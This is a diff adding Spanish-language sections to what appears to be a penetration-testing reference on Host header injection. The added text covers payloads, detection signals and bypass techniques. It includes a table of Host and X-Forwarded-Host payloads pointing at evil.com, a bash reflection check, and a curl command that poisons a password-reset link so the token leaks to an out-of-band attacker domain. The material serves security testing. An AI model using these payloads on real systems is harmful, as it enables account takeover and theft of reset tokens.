@@ -92,6 +92,57 @@ chains_with: [password-reset, cache-poisoning, oauth]
 - Burp Suite with "Update Host header to match target" **disabled** in Repeater, to send arbitrary Host values to a fixed IP.
 - A disposable test mailbox + Burp Collaborator/webhook.site as the "attacker" domain to receive poisoned links.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por canal de confianza del Host. El reflejo del Host en un body sin
+consecuencia es informativo; el payoff real es el valor envenenado llegando a un email, un `Location`
+de redirect o un backend distinto.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Host directo | `Host: evil.com` (con `--resolve` al IP real) | Ver si la app confía el Host crudo |
+| X-Forwarded-Host | `X-Forwarded-Host: evil.com` (+ `X-Forwarded-Proto: https`) | Origin detrás de CDN/LB confía el header forwarded |
+| Headers alternos | `X-Host`, `X-Forwarded-Server`, `Forwarded: host=evil.com` | Apps confían un nombre específico, no todos |
+| Reset poisoning | `Host: attacker-collab.net` en `POST /forgot-password` | Exfiltrar el token de reset al dominio atacante |
+| Routing SSRF | `Host: localhost` / `127.0.0.1` / `internal.target.internal` | Alcanzar un backend/vhost interno |
+| Default vhost | Host vacío o IP crudo vía HTTP/1.1 | Caer en el primer vhost configurado (fuga interna) |
+| Absolute-URL reflection | Host en `<link rel=canonical>`/`og:url`/JS config | Insumo para cache poisoning |
+
+Surface signals que delatan la clase antes de inyectar:
+- Links de reset/verificación con URL absoluta (`https://<domain>/reset?token=...`) construida del request.
+- `X-Forwarded-Host`/`X-Forwarded-Server`/`X-Host`/`Forwarded` aceptados en cualquier capa (CDN/LB pasa al origin).
+- Múltiples vhosts/apps en el mismo IP/LB (routing name-based compartido).
+- URLs absolutas en HTML (canonical, Open Graph, JS config) que espejan el `Host` del request.
+
+```bash
+# detección: ¿el Host/forwarded-host se refleja o altera el routing?
+for h in "Host: evil.com" "X-Forwarded-Host: evil.com" "X-Host: evil.com" "Forwarded: host=evil.com"; do
+  echo "== $h =="
+  curl -s --resolve target.com:443:"$TARGET_IP" https://target.com/ -H "$h" -k | grep -i evil.com
+done
+```
+
+```bash
+# payoff: envenenar el link de reset (inspeccionar el email recibido, no el response)
+curl -s -i -X POST https://target.com/forgot-password \
+  -H "X-Forwarded-Host: TOKEN.oast.site" \
+  -d "email=victim-test-account@yourdomain.com"
+# si el link del email lee https://TOKEN.oast.site/reset?token=<REAL> → token exfiltrable (gate OOB para el hit)
+```
+
+## Bypass Techniques
+
+Agrupadas por el control que evaden; probar la familia completa antes de cerrar como N/A.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Validación del `Host` crudo | Mover el payload a `X-Forwarded-Host`/`X-Host`/`Forwarded` | El origin suele confiar el forwarded aunque valide `Host` |
+| Header forwarded stripeado en edge | Alcanzar el origin IP directo (si está en scope) | Negativo en el edge no confirma el origin seguro |
+| Allowlist de hostname | Host port-override `target.com:1337`, `target.com.evil` | La app concatena sin re-validar el host completo |
+| APP_URL hardcodeado | N/A real: el link siempre muestra el dominio real | Confirmar vía reset-link antes de insistir |
+| Rechazo de Host desconocido | Host vacío / IP cruda → default/first vhost | Algunos servers routean lo no-matcheado al primer vhost |
+| Doble Host header | Enviar dos `Host:` y ver cuál gana en cada hop | Discrepancia proxy-vs-origin (overlapa con smuggling) |
+
 ## Root Causes
 
 - Application builds absolute URLs (for emails, redirects, canonical links) from the incoming `Host`/`X-Forwarded-Host` header instead of a server-side configured base URL/allow-list.
